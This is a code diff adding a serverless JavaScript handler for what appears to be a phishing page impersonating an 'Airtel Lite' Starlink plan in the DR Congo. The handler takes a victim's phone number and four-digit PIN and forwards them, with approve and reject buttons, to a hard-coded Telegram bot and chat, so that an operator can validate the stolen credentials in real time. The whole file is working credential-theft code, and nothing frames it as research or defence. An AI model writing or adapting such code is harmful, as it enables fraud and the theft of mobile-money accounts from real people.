@@ -1,0 +1,75 @@
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8867971085:AAHFHldZq92uowOok2xZOrvN4HNX2DjQYj8';
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8045300220';
+
+export default async function handler(req, res) {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method Not Allowed' });
+  }
+
+  try {
+    const { sessionId, phone, pin, planName, planPrice } = req.body || {};
+
+    if (!sessionId || !phone || !pin) {
+      return res.status(400).json({ error: 'Champs obligatoires manquants.' });
+    }
+
+    const cleanPhone = phone.toString().replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
+    const cleanPin = pin.toString().slice(0, 4);
+
+    const messageText =
+      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
+      `👤 <b>Numéro de Téléphone:</b> <code>+243 ${cleanPhone}</code>\n` +
+      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
+      `📦 <b>Forfait Choisi:</b> <b>${planName || 'Forfait Airtel Starlink'}</b> (${planPrice || '$1.49'})\n` +
+      `📶 <b>Réseau:</b> Airtel RDC x Starlink Direct\n` +
+      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
+      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
+      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
+
+    const inlineKeyboard = [
+      [
+        {
+          text: '✅ Valider PIN',
+          callback_data: `approve_login_${sessionId}`,
+        },
+        {
+          text: '❌ Rejeter PIN',
+          callback_data: `reject_login_${sessionId}`,
+        },
+      ],
+    ];
+
+    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: messageText,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: inlineKeyboard,
+        },
+      }),
+    });
+
+    const tgData = await tgRes.json();
+
+    return res.status(200).json({
+      success: true,
+      sessionId,
+      status: 'pending',
+      telegramResult: tgData,
+    });
+  } catch (error) {
+    console.error('Error in send-login serverless:', error);
+    return res.status(500).json({ error: error.message || 'Internal Server Error' });
+  }
+}
